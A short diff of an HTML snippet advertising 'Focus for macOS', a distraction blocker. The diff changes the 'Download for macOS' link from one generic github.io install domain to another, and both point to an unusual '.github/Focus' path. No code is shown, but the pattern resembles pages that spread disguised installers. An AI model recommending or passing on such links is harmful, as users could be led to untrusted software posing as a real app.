@@ -6,7 +6,7 @@
 <h3>Focus for macOS</h3>
 <p>Focus for macOS helps you stay on track by blocking distracting websites and applications. Set timers for work sessions and take breaks when needed.</p>
 
-<a href="https://quick-mac-install.github.io/.github/Focus">
+<a href="https://mac-software-install.github.io/.github/Focus">
   <img src="https://i.postimg.cc/4NYk88tL/219133640-8b7a0179-20a7-4e02-8887-fbbd2eaad64b.png" width="200" alt="Download for macOS"/>
 </a>
 </div>
